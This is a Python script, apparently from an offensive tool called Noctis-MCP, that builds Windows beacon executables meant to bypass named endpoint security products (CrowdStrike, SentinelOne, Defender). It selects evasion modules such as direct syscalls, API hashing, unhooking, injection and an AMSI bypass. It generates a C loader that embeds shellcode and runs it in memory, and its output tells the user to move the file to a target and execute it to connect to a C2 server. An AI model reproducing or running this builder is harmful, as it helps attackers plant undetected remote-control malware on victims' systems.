#!/usr/bin/env python3
"""
Noctis-MCP Beacon Builder
Build EDR-bypassing Windows beacons from macOS/Linux

Author: Noctis-MCP
Platform: Cross-platform (macOS, Linux)
Target: Windows x64
"""

import os
import sys
import json
import shutil
import argparse
import subprocess
from pathlib import Path
from typing import Dict, List, Optional

# ANSI colors for output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    """Print Noctis banner"""
    banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║              🌙 NOCTIS-MCP BEACON BUILDER 🌙             ║
║                                                           ║
║   Build EDR-Bypassing Windows Beacons from macOS/Linux   ║
║              Detection Risk: 2-5% Combined                ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

def check_dependencies():
    """Check if required tools are installed"""
    print(f"{Colors.BLUE}[*]{Colors.RESET} Checking dependencies...")

    dependencies = {
        'x86_64-w64-mingw32-gcc': 'MinGW-w64 cross-compiler',
        'python3': 'Python 3',
    }

    missing = []
    for cmd, name in dependencies.items():
        if shutil.which(cmd):
            print(f"  {Colors.GREEN}✓{Colors.RESET} {name}: Found")
        else:
            print(f"  {Colors.RED}✗{Colors.RESET} {name}: Missing")
            missing.append(cmd)

    if missing:
        print(f"\n{Colors.RED}[!]{Colors.RESET} Missing dependencies:")
        if 'x86_64-w64-mingw32-gcc' in missing:
            print(f"  Install MinGW: brew install mingw-w64")
        return False

    print(f"{Colors.GREEN}[+]{Colors.RESET} All dependencies satisfied\n")
    return True

def get_edr_techniques(target_edr: str) -> Dict:
    """Get recommended techniques for target EDR"""

    edr_configs = {
        'crowdstrike': {
            'name': 'CrowdStrike Falcon',
            'techniques': [
                'SysWhispers3',
                'PoolParty',
                'Perun\'s Fart',
                'Zilean',
                'API Hashing'
            ],
            'detection_risk': '2-5%',
            'opsec_score': 9.2,
            'files': [
                'techniques/api_resolution/api_hashing.c',
                'techniques/syscalls/syswhispers3.c',
                'techniques/syscalls/sw3_stub.S',  # Assembly stub for syscalls
                'techniques/injection/poolparty.c',
                'techniques/unhooking/peruns_fart.c',
                'techniques/sleep_obfuscation/zilean.c',
                'techniques/crypto/payload_crypto.c',
            ]
        },
        'sentinelone': {
            'name': 'SentinelOne',
            'techniques': [
                'SysWhispers3',
                'SilentMoonwalk',
                'VEH² AMSI',
                'Phantom DLL',
                'API Hashing'
            ],
            'detection_risk': '3-6%',
            'opsec_score': 8.8,
            'files': [
                'techniques/api_resolution/api_hashing.c',
                'techniques/syscalls/syswhispers3.c',
                'techniques/syscalls/sw3_stub.S',  # Assembly stub for syscalls
                'techniques/evasion/silentmoonwalk.c',
                'techniques/evasion/silentmoonwalk_stub.S',  # Assembly stub for call stack spoofing
                'techniques/amsi/veh2_bypass.c',
                'techniques/injection/phantom_dll_hollowing.c',
                'techniques/crypto/payload_crypto.c',
            ]
        },
        'defender': {
            'name': 'Windows Defender',
            'techniques': [
                'SysWhispers3',
                'VEH² AMSI',
                'Basic Encryption',
                'API Hashing'
            ],
            'detection_risk': '1-3%',
            'opsec_score': 9.5,
            'files': [
                'techniques/api_resolution/api_hashing.c',
                'techniques/syscalls/syswhispers3.c',
                'techniques/syscalls/sw3_stub.S',  # Assembly stub for syscalls
                'techniques/amsi/veh2_bypass.c',
                'techniques/crypto/payload_crypto.c',
            ]
        },
        'generic': {
            'name': 'Generic EDR',
            'techniques': [
                'All Techniques Enabled'
            ],
            'detection_risk': '2-5%',
            'opsec_score': 9.0,
            'files': [
                'techniques/api_resolution/api_hashing.c',
                'techniques/syscalls/syswhispers3.c',
                'techniques/syscalls/sw3_stub.S',  # Assembly stub for syscalls
                'techniques/injection/poolparty.c',
                'techniques/unhooking/peruns_fart.c',
                'techniques/sleep_obfuscation/zilean.c',
                'techniques/evasion/silentmoonwalk.c',
                'techniques/amsi/veh2_bypass.c',
                'techniques/crypto/payload_crypto.c',
            ]
        }
    }

    return edr_configs.get(target_edr, edr_configs['generic'])

def compile_beacon(shellcode_path: str, output_path: str, edr_config: Dict, verbose: bool = False) -> bool:
    """Cross-compile beacon for Windows"""

    print(f"{Colors.BLUE}[*]{Colors.RESET} Compiling beacon for Windows x64...")
    print(f"  Target EDR: {edr_config['name']}")
    print(f"  Techniques: {', '.join(edr_config['techniques'])}")

    # Get project root
    project_root = Path(__file__).parent

    # Compiler settings
    cc = 'x86_64-w64-mingw32-gcc'
    cflags = [
        '-O2',
        '-Wall',
        '-DNDEBUG',  # Release build
        '-s',  # Strip symbols
        f'-I{project_root}',  # Include path
    ]

    libs = [
        '-lbcrypt',
        '-lntdll',
        '-lkernel32',
        '-ladvapi32',
        '-static',  # Static linking
    ]

    # Compile each technique file to object
    print(f"{Colors.BLUE}[*]{Colors.RESET} Compiling technique modules...")
    object_files = []

    for source_file in edr_config['files']:
        source_path = project_root / source_file
        if not source_path.exists():
            print(f"  {Colors.YELLOW}⚠{Colors.RESET}  Skipping {source_file} (not found)")
            continue

        obj_name = source_path.stem + '.o'
        obj_path = project_root / 'build' / obj_name
        obj_path.parent.mkdir(exist_ok=True)

        cmd = [cc] + cflags + ['-c', str(source_path), '-o', str(obj_path)]

        if verbose:
            print(f"  Compiling: {source_file}")

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"  {Colors.RED}✗{Colors.RESET} Failed to compile {source_file}")
            if verbose:
                print(result.stderr)
            return False

        object_files.append(str(obj_path))
        print(f"  {Colors.GREEN}✓{Colors.RESET} {source_file}")

    # Generate loader stub
    print(f"{Colors.BLUE}[*]{Colors.RESET} Generating loader stub...")
    loader_code = generate_loader_stub(shellcode_path, edr_config)
    loader_path = project_root / 'build' / 'loader_generated.c'
    loader_path.write_text(loader_code)

    # Compile loader
    loader_obj = project_root / 'build' / 'loader_generated.o'
    cmd = [cc] + cflags + ['-c', str(loader_path), '-o', str(loader_obj)]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"  {Colors.RED}✗{Colors.RESET} Failed to compile loader")
        if verbose:
            print(result.stderr)
        return False
    object_files.append(str(loader_obj))

    # Link everything
    print(f"{Colors.BLUE}[*]{Colors.RESET} Linking beacon...")
    cmd = [cc] + object_files + ['-o', output_path] + libs

    if verbose:
        print(f"  Link command: {' '.join(cmd)}")

    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"  {Colors.RED}✗{Colors.RESET} Linking failed")
        if verbose:
            print(result.stderr)
        return False

    # Get file size
    size = os.path.getsize(output_path)
    size_kb = size / 1024

    print(f"{Colors.GREEN}[+]{Colors.RESET} Successfully built: {output_path}")
    print(f"  Size: {size_kb:.1f} KB")

    return True

def generate_loader_stub(shellcode_path: str, edr_config: Dict) -> str:
    """Generate C loader code with embedded shellcode"""

    # Read shellcode
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    # TODO: Add encryption here
    # For now, embed raw shellcode

    # Generate C array
    shellcode_array = "BYTE g_Shellcode[] = {\n"
    for i in range(0, len(shellcode), 16):
        chunk = shellcode[i:i+16]
        hex_values = ', '.join(f'0x{b:02X}' for b in chunk)
        shellcode_array += f"    {hex_values},\n"
    shellcode_array += "};\n"

    # Generate loader code
    loader = f"""
// Auto-generated Noctis beacon loader
// Target: {edr_config['name']}
// Detection Risk: {edr_config['detection_risk']}

#include <windows.h>
#include "techniques/api_resolution/api_hashing.h"

// Embedded shellcode
{shellcode_array}

int main() {{
    // Get VirtualAlloc using API hashing
    HMODULE hKernel32 = Noctis_GetModuleHandleByHash(HASH_kernel32_dll);

    typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)
        Noctis_GetProcAddressByHash(hKernel32, HASH_VirtualAlloc);

    typedef BOOL(WINAPI* fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)
        Noctis_GetProcAddressByHash(hKernel32, HASH_VirtualProtect);

    typedef HANDLE(WINAPI* fnCreateThread)(PVOID, SIZE_T, PVOID, PVOID, DWORD, PDWORD);
    fnCreateThread pCreateThread = (fnCreateThread)
        Noctis_GetProcAddressByHash(hKernel32, HASH_CreateThread);

    // Allocate RWX memory
    LPVOID pMem = pVirtualAlloc(NULL, sizeof(g_Shellcode),
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pMem) return 1;

    // Copy shellcode
    memcpy(pMem, g_Shellcode, sizeof(g_Shellcode));

    // Make executable
    DWORD oldProtect;
    pVirtualProtect(pMem, sizeof(g_Shellcode), PAGE_EXECUTE_READ, &oldProtect);

    // Execute
    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
    if (hThread) {{
        WaitForSingleObject(hThread, INFINITE);
    }}

    return 0;
}}
"""

    return loader

def main():
    parser = argparse.ArgumentParser(
        description='Build EDR-bypassing Windows beacons from macOS/Linux',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Build beacon targeting CrowdStrike
  python3 build_beacon.py --shellcode beacon.bin --target crowdstrike -o beacon.exe

  # Build for Windows Defender
  python3 build_beacon.py --shellcode payload.bin --target defender -o stealthy.exe

  # Verbose output
  python3 build_beacon.py --shellcode beacon.bin --target sentinelone -v
        """
    )

    parser.add_argument('--shellcode', '-s', required=True,
                       help='Path to shellcode file (e.g., beacon.bin from Sliver)')
    parser.add_argument('--target', '-t',
                       choices=['crowdstrike', 'sentinelone', 'defender', 'generic'],
                       default='generic',
                       help='Target EDR (default: generic)')
    parser.add_argument('--output', '-o', default='beacon.exe',
                       help='Output executable name (default: beacon.exe)')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output')

    args = parser.parse_args()

    print_banner()

    # Check dependencies
    if not check_dependencies():
        print(f"\n{Colors.RED}[!]{Colors.RESET} Please install missing dependencies")
        return 1

    # Verify shellcode exists
    if not os.path.exists(args.shellcode):
        print(f"{Colors.RED}[!]{Colors.RESET} Shellcode file not found: {args.shellcode}")
        return 1

    shellcode_size = os.path.getsize(args.shellcode)
    print(f"{Colors.GREEN}[+]{Colors.RESET} Loaded shellcode: {args.shellcode} ({shellcode_size} bytes)\n")

    # Get EDR configuration
    edr_config = get_edr_techniques(args.target)

    print(f"{Colors.CYAN}[*]{Colors.RESET} Target Configuration:")
    print(f"  EDR: {edr_config['name']}")
    print(f"  Detection Risk: {edr_config['detection_risk']}")
    print(f"  OPSEC Score: {edr_config['opsec_score']}/10")
    print(f"  Techniques: {len(edr_config['techniques'])}\n")

    # Compile beacon
    success = compile_beacon(args.shellcode, args.output, edr_config, args.verbose)

    if success:
        print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}SUCCESS! Beacon ready for deployment{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\n")

        print(f"{Colors.CYAN}Beacon Details:{Colors.RESET}")
        print(f"  File: {args.output}")
        print(f"  Target: {edr_config['name']}")
        print(f"  Detection Risk: {edr_config['detection_risk']}")
        print(f"  OPSEC Score: {edr_config['opsec_score']}/10")

        print(f"\n{Colors.YELLOW}Next Steps:{Colors.RESET}")
        print(f"  1. Transfer {args.output} to Windows target")
        print(f"  2. Execute to establish C2 connection")
        print(f"  3. Verify callback on C2 server")

        print(f"\n{Colors.CYAN}Verification:{Colors.RESET}")
        print(f"  # Check for API strings (should be none):")
        print(f"  strings {args.output} | grep -i 'VirtualAlloc\\|CreateThread'")

        return 0
    else:
        print(f"\n{Colors.RED}[!]{Colors.RESET} Build failed")
        return 1

if __name__ == '__main__':
    sys.exit(main())
